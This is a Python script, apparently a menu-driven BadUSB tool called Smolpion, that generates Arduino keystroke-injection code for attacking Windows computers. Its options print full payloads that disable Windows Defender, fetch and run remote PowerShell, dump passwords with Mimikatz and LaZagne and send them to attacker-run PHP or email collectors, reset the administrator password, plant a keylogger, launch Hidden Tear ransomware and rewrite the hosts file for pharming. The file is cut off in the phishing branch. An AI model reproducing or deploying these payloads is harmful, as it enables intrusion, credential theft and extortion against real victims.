#!/usr/bin/python
# -*- coding: utf-8 -*-
print("""\x1b[1;32m          
.....                  ..  `.`                
.....            -:shhdhd++ymo`              
.....            shshyo+-   -om:             
.....                         yN:            
.....                         oMy            
.....                         :MN`           
.....                        `hMN            
.....                        yMMM`   ````    
.....                     -/yMMMd  -ralph+-  
.....        `.:/:-.     :NMMMMM/ /m+    `/- 
.....      -mohnixMh    -mMMMMNy-os-       ` 
.....   `:ydh+.   hNsy+hNMMMMMmhmhs+y:       
.....  -::s`      :mMNMMMMMdddy+/-` /s+      
.....  ``/`       `s/-NMMMMy/+++-     o      
.....   `          o  yyhhmNs``:m-    -      
.....              .      oMM.  /:           
.....                  /hmNMh`  :            
.....                `yMMMNo`                
.....           ..-:/smMdo.                  
.....           ``````yo`                    
.....               :+-  \x1b[1;31m
        ___ __  __  ___  _    ___ ___ ___  _  _ 
       / __|  \/  |/ _ \| |  | _ \_ _/ _ \| \| |
       \__ \ |\/| | (_) | |__|  _/| | (_) | .` |
       |___/_|  |_|\___/|____|_| |___\___/|_|\_|
  \x1b[1;37m                
        \x1b[1;37mCreated By  \x1b[1;35m:\x1b[1;36m  Raphael Molina                       
        \x1b[1;37mFollow me   \x1b[1;35m:\x1b[1;36m  facebook.com/AccessGrantedChannel 
        \x1b[1;37mVersion     \x1b[1;35m:\x1b[1;36m  1.2 \x1b[0;37m
.........................................................
\x1b[0;33m
     \x1b[1;37m[1] \x1b[1;33mObtener reverse shell con Meterpreter 
     \x1b[1;37m[2] \x1b[1;33mApagar el equipo victima
     \x1b[1;37m[3] \x1b[1;33mExtraer contraseñas de los usuarios de Windows
     \x1b[1;37m[4] \x1b[1;33mCambiar contraseña del administrador de Windows
     \x1b[1;37m[5] \x1b[1;33mExtraer todas las contraseñas guardadas(W8,W10)
     \x1b[1;37m[6] \x1b[1;33mInfectar victima con Keylogger (RCE)
     \x1b[1;37m[7] \x1b[1;33mSecuestrar computadora victima con Ransomware 
     \x1b[1;37m[8] \x1b[1;33mHackear Facebook y otros servicios (Phi/Pha)
     \x1b[1;37m[9] \x1b[1;33mCrear Backdoor persistente en el equipo victima
     \x1b[1;37m[0] \x1b[1;33mSmolpion String Converter         
""")
eleccion = int(input("\033[4;32mSmolpion@HID-Attack >> "))
#_____________________________________________________________________________
#_____________________________________________________________________________
if eleccion == 1:

  print"""
PARA OBTENER UNA SHELL DE METERPRETER ES NECESARIO HABER SUBIDO
EL EJECUTABLE PREVIAMENTE A UN SERVIDOR REMOTO. 
"""
  import re 
  print
  servidor = raw_input("\x1b[0;1;36mINGRESA LA URL DE TU SERVIDOR REMOTO: >> ")
  servidor_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, servidor_reem.keys())))  
  new_servidor = regex.sub(lambda x: str(servidor_reem[x.string[x.start() :x.end()]]), servidor)
  print 
  one_cade1 = """Keyboard.print("powershell Set/MpPreference /DisableRealtimeMonitoring $true ^^ powershell /nop /c @iex*New/Object Net.WebClient(.DownloadString*-"""
  one_cade2 = (new_servidor)
  one_cade3 = """-(@");"""

  print """
\033[0;1;32mCOMPILA EL SIGUIENTE CODIGO EN TU DISPOSITIVO SMOLPION CON EL IDE DE ARDUINO.

  \x1b[0;1;37m#include "Keyboard.h"
void typeKey(uint8_t key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup() {
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(3000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("powershell start/process cmd /verb runas");

  typeKey(KEY_RETURN);

  delay(3000);

  typeKey(KEY_LEFT_ARROW);

  typeKey(KEY_RETURN);

  delay(3000);"""
  print
  one_concaty ="  {0}{1}{2}"
  print one_concaty.format(one_cade1, one_cade2, one_cade3)
  print"""

typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}"""

  
#_______________________________________________________________________________
#_______________________________________________________________________________
elif eleccion == 2:
  tiempo = int(input("En cuantos segundos deseas apagar la computadora victima?(Ej:1)>> "))
  print """
\033[0;1;32mCOMPILA EL SIGUIENTE CODIGO EN TU DISPOSITIVO SMOLPION CON EL IDE DE ARDUINO.\033[0;1;37m

  \033[0;1;37m#include "Keyboard.h"

  void typeKey(uint8_t key)
  {
    Keyboard.press(key);
    delay(50);
    Keyboard.release(key);
  }

  /* Init function */
  void setup()
  {
    // Begining the Keyboard stream
    Keyboard.begin();

    // Wait 500ms
    delay(500);

    delay(3000);

    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();

    delay(500);

    Keyboard.print("cmd");

    delay(500);

    typeKey(KEY_RETURN);

    delay(1000);

    Keyboard.print("shutdown /s /t""",
  print (tiempo),
  print """");"""

  print """    typeKey(KEY_RETURN);

    // Ending stream
    Keyboard.end();
  }

  /* Unused endless loop */
  void loop() {}  """
#________________________________________________________________________
#________________________________________________________________________
elif eleccion == 3:
  print """
\x1b[0;1;37mESTE ATAQUE SE LLEVARÁ A CABO INVOCANDO MIMIKATZ DESDE UN SERVIDOR REMOTO
CON LA MERA FINALIDAD DE QUE NO TOQUE EL DISCO DURO DEL ORDENADOR OBJETIVO, SINO QUE EXTRAIGA 
LAS CONTRASEÑAS DE LOS USUARIOS DE WINDOWS VOLCANDO EL PROCESO LSASS.EXE DESDE LA MEMORIA RAM,
EVITANDO INYECTAR LA LIBRERIA SEKURLSA.DLL EN EL PROCESO DE LSASS. DE ESTA MANERA SE ELIMINA LA 
POSIBILIDAD DE QUE MIMIKATZ SEA DETECTADO POR LOS ANTIVIRUS, PUES NO HAY NECESIDAD DE INYECTAR 
NADA EN EL EQUIPO VICTIMA Y NO SE DEBERÁ LIDIAR CON TÉCNICAS DE EVASIÓN DE MALWARE.

  ACCEDE A: 
  \x1b[1;31mhttps://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1
  \x1b[0;1;37mCOPIA LAS 2752 LINEAS DE CÓDIGO, GUARDA EL ARCHIVO CON LA EXTENSION .ps1 (EJ: mimikatz.ps1)
  Y SUBE EL ARCHIVO A TU SERVIDOR REMOTO.

  DESPUÉS COPIA EL SIGUIENTE CÓDIGO:

  \x1b[1;31m<?php
  $file = $_SERVER['REMOTE_ADDR'] . "_" . date("Y-m-d_H-i-s") . ".creds";
  file_put_contents($file, file_get_contents("php://input"));
  ?>

  \x1b[0;1;37mGUARDA EL ARCHIVO CON LA EXTENSIÓN .php (EJ: captura.php) Y SUBE EL ARCHIVO A LA MISMA
  RUTA QUE EL ANTERIOR.

  Y LISTO!! AL COMPLETAR EL ATAQUE SE GENERARÁ UN NUEVO ARCHIVO EN ESTA MISMA RUTA, EN EL
  CUAL ESTARÁN LAS CONTRASEÑAS EN TEXTO PLANO DE LOS USUARIOS DEL EQUIPO VICTIMA"""

  import re    
  print 
  remote_serv = raw_input("\x1b[1;36mIngresa la ruta del archivo .ps1 (Ej: http://server.com/tar/mimikatz.ps1>>")
  reemply = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, reemply.keys())))  
  nuev_cad = regex.sub(lambda x: str(reemply[x.string[x.start() :x.end()]]), remote_serv)
  print
#__________________________________________________________________
  arch_php = raw_input("\x1b[1;36mIngresa la ruta del archivo .php (Ej: http://server.com/tar/captura.php)>>")
  reemplyz = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, reemplyz.keys())))  
  archy_php = regex.sub(lambda x: str(reemplyz[x.string[x.start() :x.end()]]), arch_php)
#_______________________________________________________
  caden1 = """    Keyboard.print("powershell /NoP /NonI /W Hidden /Exec Bypass /c @IEX*New/Object Net.WebClient(.DownloadString*-"""
  caden2 = (nuev_cad)
  caden3 = """-(<$o)Invoke/Mimikatz /DumpCreds<*New/Object Net.WebClient(.UploadString*-"""
  caden4 = (archy_php)
  caden5 = """-,$o(@^exit");"""

  print """
    \033[0;1;32mCOMPILA EL SIGUIENTE CODIGO EN TU DISPOSITIVO SMOLPION CON EL IDE DE ARDUINO.
  
    \x1b[0;1;37m#include "Keyboard.h"

    void typeKey(uint8_t key)
    {
      Keyboard.press(key);
      delay(50);
      Keyboard.release(key);
    }

    /* Init function */
    void setup()
    {
      // Begining the Keyboard stream
      Keyboard.begin();

      // Wait 500ms
      delay(500);

      delay(3000);

      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press('r');
      Keyboard.releaseAll();

      delay(500);

      Keyboard.print("powershell Start/Process cmd /Verb runAs");

      typeKey(KEY_RETURN);

      delay(3000);

      typeKey(KEY_LEFT_ARROW);
      typeKey(KEY_RETURN);
      

      delay(2000);"""

  concat ="{0}{1}{2}{3}{4}"
  print concat.format(caden1, caden2, caden3, caden4, caden5)
  print """

      typeKey(KEY_RETURN);

      // Ending stream
      Keyboard.end();
    }

    /* Unused endless loop */
    void loop() {} """
#_____________________________________________________________
elif eleccion == 4:
  import re
  print 
  user_name = raw_input("\x1b[1;36mINGRESA EL NOMBRE DE USUARIO>> ")
  reemplx = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, reemplx.keys())))  
  new_cad = regex.sub(lambda x: str(reemplx[x.string[x.start() :x.end()]]), user_name)
  print 

  user_pass = raw_input("\x1b[1;36mINGRESA LA CONTRASEÑA QUE DESEAS ASIGNAR>> ")
  reemplxa = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, reemplxa.keys())))  
  new_userpass = regex.sub(lambda x: str(reemplxa[x.string[x.start() :x.end()]]), user_pass)
  print

  cade1 = 'Keyboard.print("'
  cade2 = (new_userpass)
  cade3 = """");"""

  print """
\033[0;1;32mCOMPILA EL SIGUIENTE CODIGO EN TU DISPOSITIVO SMOLPION CON EL IDE DE ARDUINO.
  
    \x1b[0;1;37m#include "Keyboard.h"

    void typeKey(uint8_t key)
    {
      Keyboard.press(key);
      delay(50);
      Keyboard.release(key);
    }

    /* Init function */
    void setup()
    {
      // Begining the Keyboard stream
      Keyboard.begin();

      // Wait 500ms
      delay(500);

      delay(3000);

      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press('r');
      Keyboard.releaseAll();

      delay(500);

      Keyboard.print("powershell Start/Process cmd /Verb runAs");

      typeKey(KEY_RETURN);

      delay(3000);

      typeKey(KEY_LEFT_ARROW);

      typeKey(KEY_RETURN);

      delay(2000);

      Keyboard.print("net user""",

  print (new_cad),

  print """}");"""
  print
  print """      typeKey(KEY_RETURN);"""
  print
  concaty ="      {0}{1}{2}"
  print concaty.format(cade1, cade2, cade3)
  print
  print """      typeKey(KEY_RETURN);

      delay(300);"""
  print
  print concaty.format(cade1, cade2, cade3)
  print
  print"""      typeKey(KEY_RETURN);

      delay(100);

      Keyboard.print("exit");

      typeKey(KEY_RETURN);

      // Ending stream
      Keyboard.end();
    }

    /* Unused endless loop */
    void loop() {} """
#________________________________________________________________
elif eleccion == 5:
  print """
\x1b[0;1;37mESTE ATAQUE EXTRAE TODAS LAS CONTRASEÑAS GUARDADAS EN EL EQUIPO VICTIMA CON AYUDA DE LAZAGNE...
LAZAGNE SE ENCARGARÁ DE EXTRAER LAS CONTRASEÑAS DE LOS SIGUIENTES SERVICIOS:

  \x1b[1;1;32mFACEBOOK   TWITTER   WiFi_Networks   PUTTY     CHROME   PIDGIN   OpenSSH   FILEZILLA 

  FIREFOX    OPERA     WINSCP	       OUTLOOK   SKYPE    FIREFOX  IE        APACHE

  CoreFTP    JITSI     SQLdeveloper    THUNDERBIRD    

  \x1b[0;1;37m1.- DESCARGA LAZAGNE.EXE DESDE LA URL SIGUIENTE: \x1b[1;31mhttps://github.com/AlessandroZ/LaZagne/releases/

  \x1b[0;1;37m2.- CREA UN ARCHIVO LLAMADO exec.ps1 (GUARDALO CON LA EXTENSION .ps1) CON EL SIGUIENTE CONTENIDO:

  \x1b[1;31m./lazagne.exe all -v >> passwords.txt; powershell -ExecutionPolicy Bypass ./power_mail.ps1; del lazagne.exe; del power_mail.ps1; del passwords.txt; del exec.ps1

  \x1b[0;1;37m3.- CREA UN ARCHIVO LLAMADO power_mail.ps1 (GUARDALO CON LA EXTENSION .ps1) CON EL SIGUIENTE CONTENIDO:

  \x1b[1;31m$SMTPServer = 'smtp.gmail.com'
  $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
  $SMTPInfo.EnableSsl = $true
  $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('tucorreo@gmail.com', 'TuPassword');
  $ReportEmail = New-Object System.Net.Mail.MailMessage
  $ReportEmail.From = 'tucorreo@gmail.com' 
  $ReportEmail.To.Add('tucorreo@gmail.com')
  $ReportEmail.Subject = 'REPORTE'
  $ReportEmail.Body = 'Reporte de passwords'
  $ReportEmail.Attachments.Add('c:\windows\system32\passwords.txt')
  $SMTPInfo.Send($ReportEmail)

  \x1b[1;33m*** LOS TRES ARCHIVOS ANTERIORES DEBEN ESTAR EN EL MISMO DIRECTORIO DE TU SERVIDOR REMOTO *** """
  import re
  print 
  laza = raw_input("\x1b[1;36mINGRESA LA RUTA DE lazagne.exe: >> ")
  laza_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, laza_reem.keys())))  
  new_laza = regex.sub(lambda x: str(laza_reem[x.string[x.start() :x.end()]]), laza)
  print 

  arch_exec = raw_input("\x1b[1;36mINGRESA LA RUTA DE exec.ps1: >> ")
  exec_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, exec_reem.keys())))  
  new_exec = regex.sub(lambda x: str(exec_reem[x.string[x.start() :x.end()]]), arch_exec)
  print

  mail = raw_input("\x1b[1;36mINGRESA LA RUTA DE power_mail.ps1: >> ")
  mail_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, mail_reem.keys())))  
  new_mail = regex.sub(lambda x: str(mail_reem[x.string[x.start() :x.end()]]), mail)

  five_start = """Keyboard.print("$down ) New/Object System.Net.WebClient< $url ) -"""
  five_cade1 = (new_laza) 
  five_cade2 = """-< $file ) -lazagne.exe-< $down.DownloadFile*$url,$file(< $down ) New/Object System.Net.WebClient< $url ) -"""
  five_cade3 = (new_mail)
  five_cade4 = """-< $file ) -power?mail.ps1-< $down.DownloadFile*$url,$file(< $down ) New/Object System.Net.WebClient< $url ) -"""
  five_cade5 = (new_exec)
  five_cade6 = """-< $file ) -exec.ps1-< $down.DownloadFile*$url,$file(");"""
  print """
  \033[0;1;32mCOMPILA EL SIGUIENTE CODIGO EN TU DISPOSITIVO SMOLPION CON EL IDE DE ARDUINO.

    \x1b[0;1;37m#include "Keyboard.h"

    void typeKey(uint8_t key)
    {
      Keyboard.press(key);
      delay(50);
      Keyboard.release(key);
    }

    /* Init function */
    void setup()
    {
      // Begining the Keyboard stream
      Keyboard.begin();

      // Wait 500ms
      delay(500);

      delay(3000);

      Keyboard.press(KEY_LEFT_CTRL);
      Keyboard.press(KEY_ESC);
      Keyboard.releaseAll();

      delay(500);

      Keyboard.print("powershell");

      delay(500);

      Keyboard.press(KEY_LEFT_CTRL);
      Keyboard.press(KEY_LEFT_SHIFT);
      Keyboard.press(KEY_RETURN);
      Keyboard.releaseAll();

      delay(3000);

      typeKey(KEY_LEFT_ARROW);

      typeKey(KEY_RETURN);

      delay(4000);"""
  print
  five_concaty ="      {0}{1}{2}{3}{4}{5}{6}"
  print five_concaty.format(five_start, five_cade1, five_cade2, five_cade3, five_cade4, five_cade5, five_cade6)
  print"""

      typeKey(KEY_RETURN);

      delay(9000);

      Keyboard.print("powershell /ExecutionPolicy Bypass .&exec.ps1< exit");

      typeKey(KEY_RETURN);

      // Ending stream
      Keyboard.end();
    }

    /* Unused endless loop */
    void loop() {} """
#__________________________________________
elif eleccion == 6:
  print """
\x1b[0;1;37mPARA LLEVAR A CABO ESTE ATAQUE, ES NECESARIO GENERAR EL KEYLOGGER EN LA HERRAMIENTA BEELOGGER,
GRACIAS A ESTA HERRAMIENTA LAS PULSACIONES DE TECLAS DE LA VICTIMA SERÁN ENVIADAS A TU CORREO 
DE GMAIL CADA 2 MINUTOS.

\x1b[1;33m** EL USUARIO PUEDE SERVIRSE DE ESTE MISMO MÓDULO PARA EJECUTAR CUALQUIER MALWARE REMOTO **

  \x1b[0;1;37m1.- EJECUTA EN UNA TERMINAL: \x1b[1;31mgit clone https://github.com/4w4k3/BeeLogger.git

  \x1b[0;1;37m2.- EJECUTA EL FICHERO LLAMADO install.sh: \x1b[1;31m./install.sh

  \x1b[0;1;37m3.- EJECUTA EL FICHERO LLAMADO bee.py: \x1b[1;31m./bee.py

  \x1b[0;1;37m4.- Y SIGUE LOS PASOS PARA GENERAR TU KEYLOGGER PERSONALIZADO

  \x1b[1;33m** ACTIVA EL ACCESO A LAS APLICACIONES MENOS SEGURAS EN TU CUENTA DE GMAIL EN:
  \x1b[1;31mhttps://myaccount.google.com/lesssecureapps

  \x1b[1;33m** UNA VEZ QUE OBTENGAS EL EJECUTABLE DE TU KEYLOGGER, SUBELO A TU SERVIDOR REMOTO **"""
  print
  import re
  six_serv = raw_input ("\x1b[1;36mINGRESA LA RUTA DE TU KEYLOGGER:>> ")
  six_serv_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, six_serv_reem.keys())))  
  new_six_serv = regex.sub(lambda x: str(six_serv_reem[x.string[x.start() :x.end()]]), six_serv)
  print 

  six_name = raw_input ("\x1b[1;36mINGRESA EL NOMBRE DE TU KEYLOGGER:>> ")
  six_name_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, six_name_reem.keys())))  
  new_six_name = regex.sub(lambda x: str(six_name_reem[x.string[x.start() :x.end()]]), six_name)
  print 

  six_cade1 = """Keyboard.print("$down ) New/Object System.Net.WebClient< $url ) -"""
  six_cade2 = (new_six_serv)
  six_cade3 = """-< $file ) -"""
  six_cade4 = (new_six_name) 
  six_cade5 = """-< $down.DownloadFile*$url,$file(< $exec ) New/Object /com shell.application< $exec.shellexecute*$file(< exit<");"""

  print """
  \033[0;1;32mCOMPILA EL SIGUIENTE CODIGO EN TU DISPOSITIVO SMOLPION CON EL IDE DE ARDUINO.

    \x1b[0;1;37m#include "Keyboard.h"

    void typeKey(uint8_t key) {
      Keyboard.press(key);
      delay(50);
      Keyboard.release(key);
    }

    /* Init function */
    void setup() {
      // Begining the Keyboard stream
      Keyboard.begin();

      // Wait 500ms
      delay(500);

      delay(3000);

      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press('r');
      Keyboard.releaseAll();

      delay(500);

      Keyboard.print("powershell Start/Process powershell /Verb runAs");

      typeKey(KEY_RETURN);

      delay(3000);

      typeKey(KEY_LEFT_ARROW);

      typeKey(KEY_RETURN);

      delay(2000);"""
  print
  six_concaty ="      {0}{1}{2}{3}{4}"
  print six_concaty.format(six_cade1, six_cade2, six_cade3, six_cade4, six_cade5)
  print"""

      typeKey(KEY_RETURN);

      // Ending stream
      Keyboard.end();
    }

    /* Unused endless loop */
    void loop() {}"""
#________________________________________________________
elif eleccion == 7:
  print """
\x1b[0;1;37mESTE ATAQUE SE LLEVARÁ A CABO UTILIZANDO EL RANSOMWARE HIDDEN TEAR, DESACTIVANDO WINDOWS DEFENDER
Y EJECUTANDO EL RANSOMWARE DESDE UN SERVIDOR REMOTO.

\x1b[1;33m** EL USUARIO PUEDE SERVIRSE DE ESTE MISMO MÓDULO PARA EJECUTAR CUALQUIER MALWARE QUE NECESITE
DESACTIVAR EL ANTIVIRUS ANTES DE SU EJECUCIÓN **

\x1b[0;1;37m1.- DESCARGA HIDDEN TEAR EJECUTANDO EN UNA CONSOLA: 
    \x1b[1;31mgit clone https://github.com/goliate/hidden-tear.git

\x1b[0;1;37m2.- DESCARGA MONODEVELOPER: \x1b[1;31msudo apt-get install monodevelop    

\x1b[0;1;37m3.- ABRE EL ARCHIVO hidden-tear.sln Y MODIFICA LO NECESARIO PARA EL BUEN FUNCIONAMIENTO DEL RANSOMWARE 
    RUTA: --->   \x1b[1;31mhidden-tear/hidden-tear/hidden-tear.sln

\x1b[0;1;37m4.- COMPILA EL RANSOMWARE Y SUBELO A TU SERVIDOR REMOTO

\x1b[0;1;37m5.- CREA UN ARCHIVO PHP, GUARDALO CON EL NOMBRE write.php Y SUBELO A TU SERVIDOR REMOTO 
    CON EL SIGUIENTE CONTENIDO: 

    \x1b[1;31m<?php
    $archivo = fopen("out.txt", "w") or die("No se puede abrir el archivo");
    $txt = $_GET["info"];
    fwrite($archivo, $txt);
    fclose($archivo);
    ?>"""
  print
  import re
  seven_serv = raw_input("\x1b[1;36mINGRESA LA RUTA DE TU RANSOMWARE:>> ")
  seven_serv_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, seven_serv_reem.keys())))  
  new_seven_serv = regex.sub(lambda x: str(seven_serv_reem[x.string[x.start() :x.end()]]), seven_serv)
  print 

  seven_name = raw_input ("\x1b[1;36mINGRESA EL NOMBRE DE TU RANSOMWARE:>> ")
  seven_name_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, seven_name_reem.keys())))  
  new_seven_name = regex.sub(lambda x: str(seven_name_reem[x.string[x.start() :x.end()]]), seven_name)
  print

  seven_cade1 = """Keyboard.print(F("Set/MpPreference /DisableRealtimeMonitoring $true < $down ) New/Object System.Net.WebClient< $url ) -"""
  seven_cade2 = (new_seven_serv)
  seven_cade3 = """-< $file ) -"""
  seven_cade4 = (new_seven_name) 
  seven_cade5 = """-< $down.DownloadFile*$url,$file(< $exec ) New/Object /com shell.application< $exec.shellexecute*$file(< exit<"));"""

  print """
\033[0;1;32mCOMPILA EL SIGUIENTE CODIGO EN TU DISPOSITIVO SMOLPION CON EL IDE DE ARDUINO.

\x1b[0;1;37m#include "Keyboard.h"

void typeKey(uint8_t key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup() {
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(3000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print(F("powershell Start/Process powershell /Verb runAs"));

  typeKey(KEY_RETURN);

  delay(3000);

  typeKey(KEY_LEFT_ARROW);

  delay(500);

  typeKey(KEY_RETURN);

  delay(3000);"""
  
  print
  seven_concaty ="  {0}{1}{2}{3}{4}"
  print seven_concaty.format(seven_cade1, seven_cade2, seven_cade3, seven_cade4, seven_cade5)
  print"""

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}"""

#___________________________________________________
elif eleccion == 8:
  print"""
\x1b[0;1;36m1)PHARMING
2)PHISHING"""
  subelection = int(input("\033[4;32m-------------------->> "))
  if subelection == 1:
    print"""
\x1b[0;1;37mESTE ATAQUE SE LLEVARÁ A CABO MEDIANTE PHARMING LOCAL, MODIFICANDO EL ARCHIVO HOSTS.

\x1b[1;33m** EL ATAQUE ESTA PREPARADO PARA FUNCIONAR BAJO CHROME Y EJECUTAR EL MISMO PARA IGNORAR
LOS ERRORES DE CERTIFICADO ** """
    print
    import re
    oct_serv = raw_input("\x1b[1;36mINGRESA LA RUTA DE TU ARCHIVO HOSTS:>> ")
    oct_serv_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
    regex = re.compile("(%s)" % "|".join(map(re.escape, oct_serv_reem.keys())))  
    new_oct_serv = regex.sub(lambda x: str(oct_serv_reem[x.string[x.start() :x.end()]]), oct_serv)
    print 

    oct_page = raw_input ("\x1b[1;36mINGRESA LA URL DEL OBJETIVO (sin http):>> ")
    print

    oct_cade1 = """Keyboard.print("$down ) New/Object System.Net.WebClient< $url ) -"""
    oct_cade2 = (new_oct_serv)
    oct_cade3 = """-< $file ) -hosts-< $down.DownloadFile*$url,$file(");"""

    print """
\033[0;1;32mCOMPILA EL SIGUIENTE CODIGO EN TU DISPOSITIVO SMOLPION CON EL IDE DE ARDUINO.

\x1b[0;1;37m#include "Keyboard.h"
void typeKey(uint8_t key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup() {
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(3000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("powershell Start/Process powershell /Verb runAs");

  typeKey(KEY_RETURN);

  delay(3000);

  typeKey(KEY_LEFT_ARROW);

  typeKey(KEY_RETURN);

  delay(2000);

  Keyboard.print("cd drivers");

  typeKey(KEY_RETURN);

  Keyboard.print("cd etc");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("del hosts");

  typeKey(KEY_RETURN);

  Keyboard.print("cd..");

  typeKey(KEY_RETURN);

  Keyboard.print("cd..");

  typeKey(KEY_RETURN);"""

    print
    oct_concaty ="  {0}{1}{2}"
    print oct_concaty.format(oct_cade1, oct_cade2, oct_cade3)
    print"""
  typeKey(KEY_RETURN);

  delay(3000);

  Keyboard.print("move hosts drivers");

  typeKey(KEY_RETURN);

  Keyboard.print("cd drivers");

  typeKey(KEY_RETURN);

  Keyboard.print("move hosts etc");

  typeKey(KEY_RETURN);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("chrome.exe""",
    print (oct_page), 
    print"""//ignore/certificate/errors");"""

    print

    print """  typeKey(KEY_RETURN);

  delay(4000);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_RETURN);

  typeKey(KEY_TAB);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}"""
  elif subelection == 2:
    print """
